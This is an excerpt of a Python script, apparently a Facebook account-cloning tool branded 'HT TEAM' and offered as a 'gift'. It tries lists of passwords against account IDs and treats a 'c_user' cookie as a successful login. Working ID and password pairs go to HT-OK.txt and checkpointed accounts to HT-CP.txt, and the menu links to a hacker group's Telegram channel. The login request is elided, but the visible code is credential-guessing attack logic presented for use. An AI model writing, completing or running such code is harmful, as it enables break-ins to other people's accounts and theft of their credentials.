...
#-----[Logo]-----#
logo = f"""
_    _ _______   _______ ______          __  __ 
 | |  | |__   __| |__   __|  ____|   /\   |  \/  |
 | |__| |  | |       | |  | |__     /  \  | \  / |
 |  __  |  | |       | |  |  __|   / /\ \ | |\/| |
 | |  | |  | |       | |  | |____ / ____ \| |  | |
...
═══════════════════════════════════════\033[1;0m
 [\033[1;32m+\033[1;0m] \033[1;33mAUTHOR   \033[1;0m : \033[1;32mCYBER RABBI HT:)
 \033[1;0m[\033[1;32m+\033[1;0m] \033[1;33mTOOL NAME \033[1;0m: \033[1;32mHT TEAM
 \033[1;0m[\033[1;32m+\033[1;0m] \033[1;33mTOOL TYPE\033[1;0m : \033[1;32mRNDM + EMAIL CLONING
\033[1;0m [\033[1;32m+\033[1;0m] \033[1;33mSTATUS  \033[1;0m  : \033[1;32mGIFT
\033[1;0m [\033[1;32m+\033[1;0m] \033[1;33mVERSION \033[1;0m  : \033[1;32m1.0\033[1;0m
\033[1;36m═══════════════════════════════════════
    \033[1;32mWELCOME TO HT HACKER TEAM 🌺
         (KINGBOSS HT).\033[1;0m
\033[1;36m═══════════════════════════════════════\033[1;0m"""
...
def menu():
	...
	print(' \033[1;0m[\033[1;32m2\033[1;0m] \033[1;33mFOLLOW MY PAGE\033[1;0m')
	print(' \033[1;0m[\033[1;32m3\033[1;0m] \033[1;33mJOIN OUR TELEGRAM GROUP\033[1;0m')
	...
	elif mumitf in ['2','02']:os.system('xdg-open https://facebook.com/groups/1000743501516075/')
	elif mumitf in['3','03']:os.system('xdg-open https://t.me/HT_OFFICIAL_CHANNEL')
...
def main():
    ...
    print(f'\033[1;0m[\033[1;32m+\033[1;0m] \033[1;33mOk Ids Saved in /GHOST-OK.txt')
    print(f'\033[1;0m[\033[1;32m+\033[1;0m] \033[1;33mCp Ids Saved in /GHOST-CP.txt')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[HT-OK] ' +uid+ ' | ' +ps+ ' \033[0;97m')
                open('/sdcard/HT-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid = coki[24:39]
                if 'y' in cp_cpx: 
                 print('\r\r\033[1;30m[HT-CP]  ' +uid+ ' | ' +ps+ ' \033[0;97m')
                open('/sdcard/HT-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\r%smGIFT 0;97m[\033[0;96mHT\033[0;97m]  [\033[0;96m%s\033[0;97m]  [\033[0;92mOK\033[0;97m/\033[0;93mCP\033[0;97m]  [\033[0;92m%s\033[0;97m/\033[0;93m%s\033[0;97m] '%(H,loop,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
